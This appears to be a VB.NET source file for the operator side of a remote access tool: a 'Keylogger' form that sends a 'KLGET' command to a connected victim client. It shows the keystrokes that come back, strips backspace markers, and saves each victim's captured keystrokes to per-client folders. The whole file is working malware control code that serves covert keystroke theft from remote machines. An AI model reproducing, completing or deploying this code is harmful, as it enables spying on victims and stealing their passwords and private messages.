Public Class Keylogger
    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        If (Me.T1.Find(Me.TFind.Text, (Me.T1.SelectionStart + Me.T1.SelectionLength), RichTextBoxFinds.None) = -1) Then
            Me.T1.Find(Me.TFind.Text, 0, RichTextBoxFinds.None)
        End If
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        Try
            Dim start As Integer = 1
            Dim dataObject As IDataObject = Clipboard.GetDataObject
            Me.T1.ReadOnly = False
            Do While (start <> -1)
                start = Me.T1.Find("[Back]", start, RichTextBoxFinds.None)
                If (start > 0) Then
                    Dim ch As Char = Me.T1.Text.Chars((start - 1))
                    Select Case ch.ToString
                        Case "]", ChrW(10)
                            Me.T1.Select(start, "[back]".Length)
                            Me.T1.Cut()
                            Continue Do
                    End Select
                    Me.T1.Select((start - 1), ("[back]".Length + 1))
                    Me.T1.Cut()
                End If
            Loop
            Clipboard.SetDataObject(dataObject)
            Me.T1.ReadOnly = True
        Catch exception1 As Exception
        End Try
    End Sub
    Public C As Client
    Public CID As String
    Private Sub Keylogger_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        re()
    End Sub
    Sub re()
        Dim B As Byte() = SB("KLGET")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        re()
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Me.T1.Copy()
    End Sub

    Private Sub SelectAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SelectAllToolStripMenuItem.Click
        Me.T1.SelectAll()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub


    Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        Try
            If T1.Text = Nothing Then
            Else
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID) Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID)
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID & "\Keylogger") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID & "\Keylogger")
                End If


                Dim objWriter As New System.IO.StreamWriter(Application.StartupPath & "\Downloads" & "\" & CID & "\Keylogger" & "\" & DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".txt", False)
                objWriter.WriteLine(T1.Text)
                objWriter.Close()
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
End Class